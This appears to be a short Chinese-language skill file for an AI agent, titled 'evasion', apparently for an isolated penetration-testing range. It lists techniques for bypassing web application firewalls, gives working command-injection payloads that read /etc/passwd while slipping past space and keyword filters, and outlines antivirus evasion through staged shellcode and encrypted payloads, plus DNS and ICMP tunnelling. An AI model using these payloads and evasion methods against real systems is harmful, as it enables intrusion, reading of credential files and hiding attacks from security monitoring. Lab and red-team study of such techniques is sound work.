---
name: evasion
description: 检测对抗与规避。覆盖 WAF 绕过、AV 免杀、日志规避、流量混淆、安全产品对抗评分。
---

# 检测对抗流程

## WAF 绕过
- 大小写混合: `SeLeCt`
- 注释绕过: `SEL/**/ECT`
- 编码绕过: URL 双编码、Unicode
- 分块传输: Transfer-Encoding: chunked

## 命令注入绕过
```bash
# 空格替代
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat<>/etc/passwd

# 关键字绕过
c\at /etc/passwd
cat /etc/pass''wd
$(printf '\x63\x61\x74') /etc/passwd
```

## AV 免杀
- 分段加载 shellcode
- 加密 payload + 运行时解密
- 注意：本靶场为隔离内网，**禁止从互联网下载**（certutil/bitsadmin 等下载行为一律不用）——只用本机已装工具本地生成/拼接 payload

## 流量混淆
- DNS 隧道
- ICMP 隧道
- HTTP 分块 + 编码
